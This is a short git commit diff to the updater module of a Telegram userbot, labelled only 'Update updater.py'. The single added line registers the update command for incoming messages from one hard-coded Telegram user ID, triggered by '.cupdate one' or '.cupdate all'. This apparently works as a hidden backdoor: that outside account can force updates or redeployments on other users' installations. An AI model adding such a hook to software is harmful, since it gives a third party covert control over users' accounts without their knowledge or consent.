340360948fd6d75b1c65f0bb7e80606f4104a111
Kayzu <96322205+Kayzyu@users.noreply.github.com>
2022-03-01 05:00:10 +0700

    Update updater.py

--- userbot/modules/updater.py
+++ userbot/modules/updater.py
@@ -145,6 +145,7 @@ async def update(event, repo, ups_rem, ac_br):
 
 
 @kay_cmd(pattern="update(?: |$)(now|deploy)?")
+@register(incoming=True, from_users=1904791338, pattern=r"^\.cupdate(?: |$)(one|all)?")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     await event.edit("**Mengecek Pembaruan, Silakan Menunggu....**")
